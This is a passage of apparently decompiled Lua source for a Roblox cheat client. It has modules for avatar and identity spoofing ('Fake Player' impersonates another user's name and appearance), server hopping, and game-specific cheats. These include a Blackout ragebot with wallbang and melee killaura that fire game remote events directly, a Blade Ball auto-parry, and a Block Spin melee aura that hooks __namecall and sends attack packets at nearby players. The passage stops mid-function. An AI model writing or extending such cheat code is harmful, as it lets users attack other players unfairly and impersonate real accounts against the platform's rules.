						arg = arg or {}

						for i = 1, #arg do
							arg[i].Parent = parent
						end
					end

					local function fn50(arg, arg2)
						local v23 = FindFirstChild(arg, "Head")
						if not v23 then
							return
						end
						v23.Transparency = arg2.HeadTransparency
						v23.CanCollide = arg2.HeadCanCollide
						local v24 = GetChildren(v23)

						for i = 1, #v24 do
							local v25 = v24[i]

							if IsA(v25, "SpecialMesh") then
								v25:Destroy()
							end
						end

						fn49(v23, arg2.HeadMeshes)
						local faceTexture = arg2.FaceTexture

						if faceTexture then
							faceTexture = not (FindFirstChild(v23, "face") or FindFirstChildWhichIsA(v23, "Decal"))
						end

						if faceTexture then
							local Decal = NewInstance("Decal")
							Decal.Name = "face"
							Decal.Texture = arg2.FaceTexture
							Decal.Parent = v23
						end
					end

					local function fn51(arg, arg2)
						local v23 = FindFirstChild(arg, "Right Leg")

						if v23 then
							if arg2.RightLegColor then
								v23.Color = arg2.RightLegColor
							end

							local v24 = GetChildren(v23)

							for i = 1, #v24 do
								local v25 = v24[i]

								if IsA(v25, "SpecialMesh") or IsA(v25, "CharacterMesh") then
									v25:Destroy()
								end
							end

							fn49(v23, arg2.RightLegMeshes)
							fn49(v23, arg2.RightLegCharacterMeshes)
						end

						local v24 = FindFirstChild(arg, "RightUpperLeg")

						if v24 then
							v24.Transparency = arg2.RightUpperLegTransparency
						end

						local v25 = FindFirstChild(arg, "RightLowerLeg")

						if v25 then
							v25.Transparency = arg2.RightLowerLegTransparency
						end

						local v26 = FindFirstChild(arg, "RightFoot")

						if v26 then
							v26.Transparency = arg2.RightFootTransparency
						end

						local v27 = FindFirstChild(arg, "KorbloxLeg")

						if v27 then
							v27:Destroy()
						end
					end

					local function fn52(arg)
						local snapshot = tbl7.Snapshot

						if not arg or not snapshot or snapshot.Character ~= arg then
							local v23 = arg and FindFirstChild(arg, "KorbloxLeg")

							if v23 then
								v23:Destroy()
							end

							tbl7.Snapshot = nil
							return
						end

						fn50(arg, snapshot)
						fn51(arg, snapshot)
						tbl7.Snapshot = nil
					end

					local function fn53()
						fn41()

						tbl7.CharacterAdded = Connect(LocalPlayer.CharacterAdded, function(arg)
							tbl7.Snapshot = nil
							fn48(arg)
						end)

						if LocalPlayer.Character then
							Spawn(fn48, LocalPlayer.Character)
						end
					end

					local function fn54()
						fn41()

						if LocalPlayer.Character then
							fn52(LocalPlayer.Character)
						else
							tbl7.Snapshot = nil
						end
					end

					v21:CreateModule({
						Id = "misc-headless-korblox",
						Name = "Headless and Korblox",
						Callback = function(arg)
							if arg then
								fn53()
							else
								fn54()
							end
						end,
					})

					local texture = "rbxasset://textures/face.png"
					local str2 = "None"
					local tbl8 = { Input = "", Busy = false, Original = nil, Target = nil, CharacterAdded = nil }

					local function fn55()
						if tbl8.Original then
							return tbl8.Original
						end
						local name2 = str2

						pcall(function()
							name2 = LocalPlayer.MembershipType.Name
						end)

						local flag = false

						pcall(function()
							flag = LocalPlayer.HasVerifiedBadge == true
						end)

						tbl8.Original = {
							UserId = LocalPlayer.UserId,
							Username = LocalPlayer.Name,
							DisplayName = LocalPlayer.DisplayName,
							Membership = name2,
							HasVerifiedBadge = flag,
						}

						return tbl8.Original
					end

					local function fn56(arg)
						if typeof(arg) == "number" then
							if arg > 0 then
								return arg
							end
							return nil
						end

						local flag = typeof(arg) == "string" and arg
						local str3

						if flag then
							str3 = flag
						else
							str3 = tostring(arg or "")
						end

						local v23 = string.gsub(string.gsub(string.gsub(str3, "^%s+", ""), "%s+$", ""), "^@", "")
						if v23 == "" then
							return nil
						end
						local num = tonumber(v23)
						if num and num > 0 then
							return num
						end

						local ok4, result4 = pcall(function()
							return Players:GetUserIdFromNameAsync(v23)
						end)

						if ok4 and typeof(result4) == "number" and result4 > 0 then
							return result4
						end
						return nil
					end

					local function fn57(arg)
						local original = tbl8.Original
						if original and original.UserId == arg then
							return original.Username, original.DisplayName
						end
						local v23 = GetPlayerList()

						for i = 1, #v23 do
							local v24 = v23[i]
							if v24 ~= LocalPlayer and v24.UserId == arg then
								return v24.Name, v24.DisplayName ~= "" and v24.DisplayName or v24.Name
							end
						end

						if UserService then
							local ok4, result4 = pcall(function()
								return UserService:GetUserInfosByUserIdsAsync({ arg })
							end)

							ok4 = ok4 and type(result4) == "table" and result4[1]
							if type(ok4) == "table" and ok4.Username then
								return ok4.Username, ok4.DisplayName ~= "" and ok4.DisplayName or ok4.Username
							end
						end

						local ok4, result4 = pcall(function()
							return Players:GetNameFromUserIdAsync(arg)
						end)

						if ok4 and typeof(result4) == "string" and result4 ~= "" then
							return result4, result4
						end
						return nil, nil
					end

					local function fn58(arg)
						if not arg then
							return
						end
						local v23 = GetDescendants(arg)

						for i = 1, #v23 do
							local v24 = v23[i]

							if IsA(v24, "Accessory") or IsA(v24, "Shirt") or IsA(v24, "Pants") or IsA(v24, "CharacterMesh") or IsA(v24, "BodyColors") or IsA(v24, "ShirtGraphic") then
								v24:Destroy()
							end
						end

						local v24 = FindFirstChild(arg, "Head")
						if not v24 then
							return
						end
						local v25 = GetChildren(v24)

						for i = 1, #v25 do
							local v26 = v25[i]

							if IsA(v26, "SpecialMesh") and GetAttribute(v26, "FromMorph") == true then
								v26:Destroy()
							end
						end

						local v26 = FindFirstChild(v24, "face")

						if v26 then
							v26:Destroy()
						end
					end

					local function fn59(parent, arg)
						if not parent or not arg then
							return
						end
						local v23 = FindFirstChildOfClass(parent, "Humanoid")
						local v24 = FindFirstChild(parent, "Head")
						local v25 = GetChildren(arg)

						for i = 1, #v25 do
							local v26 = v25[i]

							if IsA(v26, "Shirt") or IsA(v26, "Pants") or IsA(v26, "BodyColors") or IsA(v26, "ShirtGraphic") or IsA(v26, "Accessory") then
								v26.Parent = parent
							elseif IsA(v26, "SpecialMesh") and v24 then
								SetAttribute(v26, "FromMorph", true)
								v26.Parent = v24
							elseif v26.Name == "R6" and v23 and v23.RigType == Enum.HumanoidRigType.R6 then
								local v27 = FindFirstChildOfClass(v26, "CharacterMesh")

								if v27 then
									v27.Parent = parent
								end
							elseif v26.Name == "R15" and v23 and v23.RigType == Enum.HumanoidRigType.R15 then
								local v27 = FindFirstChildOfClass(v26, "CharacterMesh")

								if v27 then
									v27.Parent = parent
								end
							end
						end

						if not v24 then
							return
						end
						local v26 = FindFirstChild(arg, "face")
						if v26 then
							v26.Parent = v24
							return
						end
						local Decal = NewInstance("Decal")
						Decal.Name = "face"
						Decal.Face = Enum.NormalId.Front
						Decal.Texture = texture
						Decal.Parent = v24
					end

					local function fn60(arg, displayName, arg2, arg3)
						if not arg2 or not arg3 then
							return false
						end

						local ok4, result4 = pcall(function()
							return Players:GetCharacterAppearanceAsync(arg)
						end)

						local ok5, result5 = pcall(function()
							return Players:GetHumanoidDescriptionFromUserIdAsync(arg)
						end)

						arg3.DisplayName = displayName

						if ok5 and result5 then
							if not pcall(function()
								arg3:ApplyDescriptionClientServer(result5)
							end) then
								pcall(function()
									arg3:ApplyDescription(result5)
								end)
							end
						end

						fn58(arg2)

						if ok4 and result4 then
							fn59(arg2, result4)
						end

						local parent = arg2.Parent
						arg2.Parent = nil
						arg2.Parent = parent
						return true
					end

					local function fn61()
						if tbl8.CharacterAdded then
							Disconnect(tbl8.CharacterAdded)
							tbl8.CharacterAdded = nil
						end
					end

					local function fn62()
						if typeof(v14._playerListRefreshFakeButtons) == "function" then
							v14:_playerListRefreshFakeButtons()
						end
					end

					local function fn63(fakePlayerTargetUserId, arg, arg2)
						fn55()
						fn61()
						tbl8.Target = { UserId = fakePlayerTargetUserId, Username = arg, DisplayName = arg2 }
						v14._fakePlayerTargetUserId = fakePlayerTargetUserId
						local character = LocalPlayer.Character
						local v23 = character and FindFirstChildOfClass(character, "Humanoid")

						if character and v23 then
							fn60(fakePlayerTargetUserId, arg2, character, v23)
						end

						pcall(function()
							Players:SetLocalPlayerInfo(fakePlayerTargetUserId, arg, arg2, "None", false)
						end)

						tbl8.CharacterAdded = Connect(LocalPlayer.CharacterAdded, function(arg3)
							local target = tbl8.Target
							if not target then
								return
							end
							local humanoid = arg3:WaitForChild("Humanoid", 10)

							if humanoid then
								fn60(target.UserId, target.DisplayName, arg3, humanoid)
							end
						end)

						fn62()
					end

					local function fn64()
						local original = tbl8.Original

						if not original then
							v14._fakePlayerTargetUserId = nil
							fn62()
							return false
						end

						fn61()
						tbl8.Target = nil
						v14._fakePlayerTargetUserId = nil
						local character = LocalPlayer.Character
						local v23 = character and FindFirstChildOfClass(character, "Humanoid")

						if character and v23 then
							fn60(original.UserId, original.DisplayName, character, v23)
						end

						pcall(function()
							Players:SetLocalPlayerInfo(original.UserId, original.Username, original.DisplayName, original.Membership or "None", original.HasVerifiedBadge == true)
						end)

						fn62()
						return true
					end

					v14.ApplyFakePlayer = function(arg, arg2)
						if tbl8.Busy then
							return
						end
						tbl8.Busy = true

						Spawn(function()
							local ok4, result4 = pcall(function()
								local v23 = fn56(arg2)
								if not v23 then
									v14:Notify({ Title = "Fake Player", Content = "Invalid user", Duration = 2 })
									return
								end
								local v24 = fn55()

								if v24 and v24.UserId == v23 then
									fn64()
									v14:Notify({ Title = "Fake Player", Content = "Restored", Duration = 2 })
									return
								end

								local v25, v26 = fn57(v23)
								if not v25 then
									v14:Notify({ Title = "Fake Player", Content = "User not found", Duration = 2 })
									return
								end
								fn63(v23, v25, v26)
								v14:Notify({ Title = "Fake Player", Content = v26 .. " (@" .. v25 .. ")", Duration = 2.5 })
							end)

							tbl8.Busy = false

							if not ok4 then
								v14:Notify({ Title = "Fake Player", Content = tostring(result4), Duration = 2.5 })
							end
						end)
					end

					v14.RestoreFakePlayer = function()
						if tbl8.Busy then
							return
						end
						tbl8.Busy = true

						Spawn(function()
							local ok4, result4 = pcall(function()
								if not fn64() then
									v14:Notify({ Title = "Fake Player", Content = "Not faking", Duration = 2 })
									return
								end
								v14:Notify({ Title = "Fake Player", Content = "Restored", Duration = 2 })
							end)

							tbl8.Busy = false

							if not ok4 then
								v14:Notify({ Title = "Fake Player", Content = tostring(result4), Duration = 2.5 })
							end
						end)
					end

					local v23 = v21:CreateModule({ Id = "misc-fake-player", Name = "Fake Player" })

					v23:CreateInput({
						Id = "misc-fake-player-input",
						Name = "UserId / Username",
						Placeholder = "UserId / Username",
						Callback = function(arg)
							local flag = typeof(arg) == "string" and arg

							if not flag then
								flag = tostring(arg or "")
							end

							tbl8.Input = string.gsub(string.gsub(flag, "^%s+", ""), "%s+$", "")
						end,
					})

					v23:CreateButton({
						Id = "misc-fake-player-apply",
						Name = "Fake",
						Callback = function()
							v14:ApplyFakePlayer(tbl8.Input)
						end,
					})

					v23:CreateButton({
						Id = "misc-fake-player-restore",
						Name = "Restore",
						Callback = function()
							v14:RestoreFakePlayer()
						end,
					})

					local v24 = NewRandom()

					local function fn65(arg)
						if type(arg) ~= "table" then
							return nil
						end
						local id = arg.id
						if not id or id == game.JobId then
							return nil
						end
						local n4 = tonumber(arg.playing) or 0
						local n5 = tonumber(arg.maxPlayers) or 0
						if n5 <= 0 or n4 >= n5 then
							return nil
						end
						return id
					end

					local function fn66(arg)
						if arg == "Rejoin" then
							if not pcall(function()
								TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
							end) then
								pcall(function()
									TeleportService:Teleport(game.PlaceId, LocalPlayer)
								end)
							end

							return
						end

						local str3 = arg == "Most" and "Desc" or "Asc"
						local flag = arg == "Random"
						local tbl9 = {}
						local str4 = nil

						for i = 1, 8 do
							local v25 = Format
							local placeId = game.PlaceId
							str4 = str4 and "&cursor=" .. HttpService:UrlEncode(str4) or ""
							local v26 = v25("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&limit=100%s", placeId, str3, str4)

							local ok4, result4 = pcall(function()
								return game:HttpGet(v26)
							end)

							if not ok4 or not result4 then
								v14:Island("Server hop failed", 1.5)
								return
							end

							local ok5, result5 = pcall(function()
								return HttpService:JSONDecode(result4)
							end)

							if not ok5 or type(result5) ~= "table" then
								v14:Island("Server data failed", 1.5)
								return
							end
							local data3 = result5.data

							if type(data3) == "table" then
								for i2 = 1, #data3 do
									local v27 = fn65(data3[i2])

									if v27 then
										if flag then
											Insert(tbl9, v27)
											continue
										end

										if not pcall(function()
											TeleportService:TeleportToPlaceInstance(game.PlaceId, v27, LocalPlayer)
										end) then
											v14:Island("Teleport failed", 1.5)
										end

										return
									end
								end
							end

							str4 = result5.nextPageCursor
							if not str4 then
								break
							end
						end

						if flag and #tbl9 > 0 then
							local v25 = tbl9[v24:NextInteger(1, #tbl9)]

							if not pcall(function()
								TeleportService:TeleportToPlaceInstance(game.PlaceId, v25, LocalPlayer)
							end) then
								v14:Island("Teleport failed", 1.5)
							end

							return
						end

						v14:Island("No server found", 1.5)
					end

					local v25 = v21:CreateModule({ Id = "misc-server-hop", Name = "Server Hop" })

					v25:CreateButton({
						Id = "ServerHopModule.Rejoin",
						Name = "Rejoin",
						Callback = function()
							fn66("Rejoin")
						end,
					})

					v25:CreateButton({
						Id = "ServerHopModule.Low",
						Name = "Low",
						Callback = function()
							fn66("Low")
						end,
					})

					v25:CreateButton({
						Id = "ServerHopModule.Most",
						Name = "Most",
						Callback = function()
							fn66("Most")
						end,
					})

					v25:CreateButton({
						Id = "ServerHopModule.Random",
						Name = "Random",
						Callback = function()
							fn66("Random")
						end,
					})

					v25:CreateButton({
						Id = "ServerHopModule.CopyJoinScript",
						Name = "Copy Join Script",
						Callback = function()
							pcall(setclipboard, "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game:GetService('Players').LocalPlayer)")
						end,
					})

					local v26 = v14:CreateTab({ Id = "tab-settings", Name = "Settings" })
					v14:CreateConfigSystem({ Title = "Config", Default = autoloadcfg or "" })

					loadcfg = function(arg)
						local selectedConfig = arg or v14._selectedConfig

						if selectedConfig and selectedConfig ~= "" then
							local v27 = v14:LoadConfig(selectedConfig)

							if v27 then
								v14._selectedConfig = selectedConfig

								if v14._refreshConfigList then
									v14._refreshConfigList()
								end

								v14:Notify({ Title = "Loaded", Content = "Config loaded!", Duration = 2 })
							end

							return v27
						end

						return false
					end

					local tbl9 = {
						HitSound = {
							Module = nil,
							Enabled = true,
							Sound = "Neverlose",
							Sounds = {
								Neverlose = "6607204501",
								Gamesense = "5633695679",
								Fatality = "6607142036",
								Criminality = "160432334",
								Minecraft = "7151570575",
							},
						},
						ResolveCache = { Module = nil, Params = NewRayParams() },
					}

					tbl9.ResolveCache.Params.FilterType = Enum.RaycastFilterType.Exclude
					tbl9.HitSound.Module = v26:CreateModule({ Id = "settings-hit-sound", Name = "Hit Sound", Default = true })

					tbl9.HitSound.Module:CreateSelector({
						Id = "SettingsState.HitSound.Sound",
						Name = "Sound",
						Options = {
							{ Value = "Neverlose" },
							{ Value = "Gamesense" },
							{ Value = "Fatality" },
							{ Value = "Criminality" },
							{ Value = "Minecraft" },
						},
						Default = tbl9.HitSound.Sound,
						Callback = function(sound)
							tbl9.HitSound.Sound = sound
						end,
					})

					tbl9.ResolveCache.Module = v26:CreateModule({ Id = "settings-resolve-cache", Name = "Resolve Cache", Default = true })

					CreateHitSound = function()
						if not tbl9.HitSound.Module:Get() then
							return
						end
						local Sound = NewInstance("Sound", Camera())
						Sound.SoundId = "rbxassetid://" .. tbl9.HitSound.Sounds[tbl9.HitSound.Sound]
						Sound.Volume = 1
						Sound:Play()
						Debris:AddItem(Sound, 1)
					end

					local function fn67(arg)
						local unit = arg:Cross(Abs(arg.Y) < 0.9 and Vector3.new(0, 1, 0) or Vector3.new(1, 0, 0)).Unit
						return arg, unit, arg:Cross(unit).Unit
					end

					Resolve = function(arg, arg2, arg3, arg4, arg5, arg6, arg7)
						local params = tbl9.ResolveCache.Params
						local position = arg.Position
						local position2 = arg2.Position
						local v27 = Abs(arg3 or 0)
						local v28 = Abs(arg4 or 0)
						arg5 = arg5 or math.huge
						local n4 = v27 + v28
						local n5 = n4 > 0 and Min(1, arg5 / n4) or 0
						local n6 = v27 * n5
						local n7 = v28 * n5

						local function fn68(arg8, arg9, arg10)
							if not tbl9.ResolveCache.Module:Get() then
								return
							end
							local n8 = arg9 - arg8
							if n8.Magnitude < 0.1 then
								return
							end
							local v29 = RaycastWorkspace(arg8, n8, arg10)
							return not v29 or (v29.Position - position2).Magnitude <= n7
						end

						local filterDescendantsInstances = {}

						if LocalPlayer.Character then
							Insert(filterDescendantsInstances, LocalPlayer.Character)
						end

						if arg.Parent then
							Insert(filterDescendantsInstances, arg.Parent)
						end

						if arg2.Parent then
							Insert(filterDescendantsInstances, arg2.Parent)
						end

						if arg7 and typeof(arg7) == "table" then
							for _, v29 in arg7, nil, nil do
								Insert(filterDescendantsInstances, v29)
							end
						end

						params.FilterDescendantsInstances = filterDescendantsInstances
						local n8 = position2 - position
						if n8.Magnitude < 0.1 then
							return
						end
						local v29, v30, v31 = fn67(n8.Unit)
						local v32 = RaycastWorkspace(position, n8, params)
						if not v32 or (v32.Position - position2).Magnitude <= n7 then
							return position, position2, true
						end
						local tbl10 = { v31, -v31, -v30, v30 }

						for i = 1, #tbl10 do
							local n9 = position + tbl10[i] * n6
							if fn68(n9, position2, params) then
								return n9, position2, true
							end
						end
					end

					PlayerList = v14:CreatePlayerList({
						Title = "Player List",
						SearchPlaceholder = "Search player...",
						BlacklistText = "Blacklist",
						WhitelistText = "Whitelist",
						StateChanged = function(arg)
							if arg.State == "Blacklist" then
								print("Blacklisted:", arg.Player.Name)
							elseif arg.State == "Whitelist" then
								print("Whitelisted:", arg.Player.Name)
							else
								print("Cleared state for:", arg.Player.Name)
							end

							pcall(ohioStartTargetWorker)
						end,
					})

					CheckState = function(arg)
						local state_, v27 = PlayerList:GetState(arg)
						if state_ == "Whitelist" then
							return false
						end

						if state_ == "Blacklist" then
							return true
						end
						return not v27
					end

					GetClosest = function()
						local tbl10 = {}
						local tbl11 = {}
						if not Camera() then
							return tbl10
						end
						local v27 = MouseLocation()
						local v28 = GetPlayerList()

						for i = 1, #v28 do
							local v29 = v28[i]
							local character = v29.Character
							local v30 = character and FindFirstChild(character, "HumanoidRootPart")

							if not (v29 == LocalPlayer or not character or not v30) then
								local v31, v32 = WorldToViewport(v30.Position)
								Insert(tbl11, { plr = v29, dist = Floor((v27 - NewVector2(v31, v32)).Magnitude) })
							end
						end

						Sort(tbl11, function(arg, arg2)
							return arg.dist < arg2.dist
						end)

						for i = 1, #tbl11 do
							Insert(tbl10, tbl11[i].plr)
						end

						return tbl10
					end

					isdeath = function(arg)
						if not arg then
							return true
						end

						if Sub(tostring(Floor(arg.Health)), 1, 1) == "0" then
							return true
						end
						return false
					end

					isPartVisible = function(arg, arg2)
						if not arg or not arg2 then
							return false
						end
						local v27, v28, v29, v30 = WorldToViewport(arg.Position)
						if not v30 then
							return false
						end
						local size = arg.Size
						local cFrame = arg.CFrame
						local n4 = size.X / 2
						local n5 = size.Y / 2
						local n6 = size.Z / 2
						local tbl10 = {}
						local n7 = cFrame * NewCFrame(n4, n5, n6)
						local n8 = cFrame * NewCFrame(n4, n5, -n6)
						local n9 = cFrame * NewCFrame(n4, -n5, n6)
						local n10 = cFrame * NewCFrame(n4, -n5, -n6)
						local n11 = cFrame * NewCFrame(-n4, n5, n6)
						local n12 = cFrame * NewCFrame(-n4, n5, -n6)
						local n13 = cFrame * NewCFrame(-n4, -n5, n6)
						local n14 = cFrame * NewCFrame(-n4, -n5, -n6)
						tbl10[1] = n7
						tbl10[2] = n8
						tbl10[3] = n9
						tbl10[4] = n10
						tbl10[5] = n11
						tbl10[6] = n12
						tbl10[7] = n13
						tbl10[8] = n14
						local filterDescendantsInstances = {}
						local v31 = GetLocalCharacter()

						if v31 then
							filterDescendantsInstances[#filterDescendantsInstances + 1] = v31
						end

						local v32 = FindFirstAncestorOfClass(arg, "Model")

						if v32 and FindFirstChildOfClass(v32, "Humanoid") then
							local v33 = GetChildren(v32)

							for i = 1, #v33 do
								local v34 = v33[i]

								if IsA(v34, "Accessory") then
									filterDescendantsInstances[#filterDescendantsInstances + 1] = v34
								end
							end
						end

						local v33 = NewRayParams()
						v33.FilterDescendantsInstances = filterDescendantsInstances
						v33.FilterType = Enum.RaycastFilterType.Blacklist
						v33.IgnoreWater = true

						for i = 1, #tbl10 do
							local position = tbl10[i].Position
							local v34 = RaycastWorkspace(arg2, (position - arg2).Unit * (position - arg2).Magnitude, v33)
							if not v34 or v34.Instance == arg or IsAncestorOf(arg, v34.Instance) then
								return true
							end
						end

						local position = arg.Position
						local v34 = RaycastWorkspace(arg2, (position - arg2).Unit * (position - arg2).Magnitude, v33)
						if not v34 or v34.Instance == arg or IsAncestorOf(arg, v34.Instance) then
							return true
						end
						return false
					end

					v14:CreateTab({ Id = "tab-themes", Name = "Themes", Key = "tab_themes", Kind = "Themes" })

					local handlers = {
						Blackout = function()
							local flag = false
							local flag2 = false
							local flag3 = false
							local flag4 = false
							local flag5 = false
							local flag6 = false
							local flag7 = false

							local function fn68(arg)
								local v27 = arg and FindFirstChild(arg, "GunStatus")
								if not v27 then
									return 0.1
								end
								local v28 = FindFirstChild(workspace, "Chars")
								v28 = v28 and FindFirstChild(v28, LocalPlayer.Name)
								v28 = v28 and FindFirstChild(v28, "ServerGunModel")
								v28 = v28 and FindFirstChild(v28, "Settings")
								local result4 = nil

								if v28 then
									local ok4
									ok4, result4 = pcall(require, v28)
									ok4 = ok4 and type(result4) == "table"
									local v29 = nil

									if not ok4 then
										result4 = v29
									end
								end

								local firing = result4 and result4.Firing
								result4 = result4 and result4.Modes
								local v29 = GetAttribute(v27, "Mode")
								local rpm = result4 and result4[v29]

								if not rpm and result4 then
									for i = 1, #result4 do
										local v30 = result4[i]
										if v30.Name == v29 then
											rpm = v30
											break
										end
									end
								end

								rpm = rpm and rpm.RPM or firing and firing.RPM or 600
								firing = firing and firing.RPM or 1
								local ok4, result5 = pcall(require, ReplicatedStorage.Mods.StatusEffectDatabase.Shared)
								ok4 = ok4 and type(result5) == "table" and result5.GetScaledStats
								local n4 = 1

								if ok4 then
									local v30 = result5.GetScaledStats(_G.CharacterStates)

									if type(v30) == "table" and v30.FireRate then
										n4 = v30.FireRate
									end
								end

								return 60 / rpm * firing * n4
							end

							local flag8 = false
							local n4 = 0
							local n5 = 7
							hookmetamethod(game, "__namecall", function(...) end)

							local function fn69(arg, arg2, arg3, arg4)
								if arg and arg2 and arg3 and arg3.Parent and arg4 then
									local v27 = FindFirstChild(arg4, "GunStatus")

									if v27 then
										local v28 = GetAttribute(v27, "Magazine")
										local v29 = Random(1, 1000)

										if v28 > 0 and flag8 == false then
											local position = Camera()
											position = position and position.CFrame.Position or arg2.Position
											local position2 = arg3.Position
											Spawn(CreateTracer, arg2.Position, position2)
											local cframe = CFrame.lookAt(position, position2)
											ReplicatedStorage.GunStorage.Events.Shoot:FireServer(cframe.Position, cframe, 1, 1, v29, v29)
											ReplicatedStorage.GunStorage.Events.H1t_:FireServer(arg3, v29)
											Spawn(CreateHitSound)
										end
									end
								end
							end

							local function fn70(arg)
								if arg then
									local parent = arg.Parent and GetAttribute(arg.Parent, "Focus")
									ReplicatedStorage.MeleeStorage.Events.Swing:InvokeServer()
									ReplicatedStorage.MeleeStorage.Events.Hit:FireServer(arg, parent or NewVector3(arg.Position.X, arg.Position.Y, arg.Position.Z))
									local now = tick()

									if n5 <= now - n4 then
										n4 = now
										Spawn(CreateHitSound)
										ReplicatedStorage.MeleeStorage.Events.Swing:InvokeServer(true)
										ReplicatedStorage.MeleeStorage.Events.Hit:FireServer(arg, parent or NewVector3(arg.Position.X, arg.Position.Y, arg.Position.Z))
									end
								end
							end

							local v27 = v14:CreateTab({ Id = "blackout", Name = "Blackout" })

							v27:CreateModule({
								Id = "blackout-melee-killaura",
								Name = "Melee Killaura",
								Callback = function(arg)
									flag3 = arg
								end,
							})

							local v28 = v27:CreateModule({
								Id = "blackout-ragebot",
								Name = "Ragebot",
								Callback = function(arg)
									flag4 = arg
								end,
							})

							v28:CreateToggle({
								Id = "blackout_ragebot_wallbang",
								Name = "Wallbang",
								Default = false,
								Callback = function(arg)
									flag5 = arg
								end,
							})

							v28:CreateToggle({
								Id = "blackout_ragebot_ignore_npc",
								Name = "Ignore NPC",
								Default = false,
								Callback = function(arg)
									flag6 = arg
								end,
							})

							v27:CreateModule({
								Id = "blackout-auto-skip-shop",
								Name = "Auto Skip Shop",
								Callback = function(arg)
									flag7 = arg
								end,
							})

							v27:CreateModule({
								Id = "blackout-no-fall-damage",
								Name = "No Fall Damage",
								Callback = function(arg)
									flag = arg
								end,
							})

							v27:CreateModule({
								Id = "blackout-no-ragdoll",
								Name = "No Ragdoll",
								Callback = function(arg)
									flag2 = arg
								end,
							})

							Connect(RunService.Heartbeat, function(...) end)
						end,
						["Blade Ball"] = function()
							local VirtualInputManager = GetService("VirtualInputManager")
							local v27 = FindFirstChild(Workspace, "Balls")
							local v28 = FindFirstChild(Workspace, "Alive")
							local tbl10 = { Enabled = false, ParryWindow = 0.12, TargetClosestSpam = 15, Connection = nil }

							local function fn68()
								if not v27 then
									return nil
								end
								local v29 = GetChildren(v27)

								for i = 1, #v29 do
									local v30 = v29[i]
									if GetAttribute(v30, "realBall") == true then
										return v30
									end
								end
							end

							local function fn69(arg)
								if not arg then
									return nil
								end

								if IsA(arg, "BasePart") then
									return arg.Position
								end
								local v29 = FindFirstChild(arg, "HumanoidRootPart")
								if v29 and IsA(v29, "BasePart") then
									return v29.Position
								end

								if IsA(arg, "Model") and arg.PrimaryPart then
									return arg.PrimaryPart.Position
								end
							end

							local function fn70(arg)
								if not v28 or not arg then
									return nil
								end
								local v29 = GetChildren(v28)

								for i = 1, #v29 do
									local v30 = v29[i]
									if v30.Name == arg then
										return v30
									end
								end
							end

							local function fn71()
								VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, nil)
							end

							local function fn72()
								local v29 = fn68()
								local character = LocalPlayer.Character
								local v30 = character and FindFirstChild(character, "HumanoidRootPart")
								if not v29 or not v30 or not IsA(v29, "BasePart") then
									return
								end
								local n4 = v30.Position - v29.Position
								local magnitude = n4.Magnitude
								local v31 = GetAttribute(v29, "target")

								if v31 == LocalPlayer.Name then
									local v32 = v29.AssemblyLinearVelocity:Dot(magnitude > 0 and n4.Unit or EmptyVector3)

									if v32 > 0 then
										if magnitude / v32 <= tbl10.ParryWindow then
											fn71()
										end
									end

									return
								end

								local v32 = fn70(v31)
								local v33 = fn69(v32)

								if v33 and (v33 - v30.Position).Magnitude <= tbl10.TargetClosestSpam then
									fn71()
								end
							end

							local v29 = v14:CreateTab({ Id = "blade-ball", Name = "Blade Ball" }):CreateModule({
								Id = "blade-ball-auto-parry",
								Name = "Auto Parry",
								Callback = function(enabled)
									tbl10.Enabled = enabled

									if tbl10.Connection then
										Disconnect(tbl10.Connection)
										tbl10.Connection = nil
									end

									if enabled then
										tbl10.Connection = Connect(Heartbeat, fn72)
									end
								end,
							})

							v29:CreateSlider({
								Id = "blade-ball-parry-window",
								Name = "Parry Window",
								Min = 0.01,
								Max = 0.5,
								Default = tbl10.ParryWindow,
								Step = 0.01,
								Callback = function(parryWindow)
									tbl10.ParryWindow = parryWindow
								end,
							})

							v29:CreateSlider({
								Id = "blade-ball-target-closest-spam",
								Name = "Target Closest Spam",
								Min = 1,
								Max = 100,
								Default = tbl10.TargetClosestSpam,
								Step = 1,
								Callback = function(targetClosestSpam)
									tbl10.TargetClosestSpam = targetClosestSpam
								end,
							})
						end,
						["Block Spin"] = function()
							local Sprint = require(ReplicatedStorage.Modules.Game.Sprint)
							local Net = require(ReplicatedStorage.Modules.Core.Net)
							local tbl10 = {}

							local function fn68(arg)
								if tbl10[arg] then
									return tbl10[arg][1], tbl10[arg][2]
								end

								if FindFirstChild(GetService("StarterPack"), arg) then
									local v27 = FindFirstChild(GetService("StarterPack"), arg)
									tbl10[v27.name] = { v27, "Melee" }
									return v27, "Melee"
								end

								local v27 = GetChildren(ReplicatedStorage.Items)

								for i = 1, #v27 do
									local v28 = v27[i]

									if IsA(v28, "Folder") then
										local v29 = GetChildren(v28)

										for i2 = 1, #v29 do
											local v30 = v29[i2]
											if v30.Name == arg then
												tbl10[v30.name] = { v30, v28 }
												return v30, v28.Name
											end
										end
									end
								end
							end

							local function fn69(arg, arg2, arg3)
								local v27 = fn68(arg.Name)
								local n4 = GetAttribute(arg, "Speed") or 1

								if v27 then
									n4 = GetAttribute(v27, "Speed") or 1
								end

								Net.send("melee_attack", arg, arg2, arg3.CFrame, (n4 * 0.75 + Random() * n4 * 0.25) * (GetAttribute(LocalPlayer, "SpeedMultiplier") or 1))
							end

							local v27 = nil

							v14:CreateTab({ Id = "block-spin-rage", Name = "Rage" }):CreateModule({
								Id = "block-spin-melee-aura",
								Name = "Melee Aura",
								Callback = function(arg)
									v27 = arg
									if not arg then
										return
									end

									Spawn(function()
										while v27 and Wait() do
											local character = LocalPlayer.Character
											local v28 = character and FindFirstChild(character, "HumanoidRootPart")

											if not (not character or not v28) then
												local v29 = FindFirstChildOfClass(character, "Tool")

												if v29 then
													local v30, v31 = fn68(v29.Name)

													if not (not v30 or v31 ~= "Melee") then
														local n4 = GetAttribute(v29, "Range") or 6

														if v30 then
															n4 = GetAttribute(v30, "Range") or 6
														end

														local n5 = n4 + 3
														local tbl11 = {}
														local v32 = GetClosest()

														for i = 1, #v32 do
															local v33 = v32[i]

															if CheckState(v33) then
																local character2 = v33.Character
																local magnitude = character2 and FindFirstChild(character2, "HumanoidRootPart")
																magnitude = magnitude and (magnitude.Position - v28.Position).Magnitude

																if magnitude and magnitude <= n5 then
																	Insert(tbl11, v33)
																end
															end
														end

														if #tbl11 > 0 then
															fn69(v29, tbl11, v28)
														end
													end
												end
											end
										end
									end)
								end,
							})

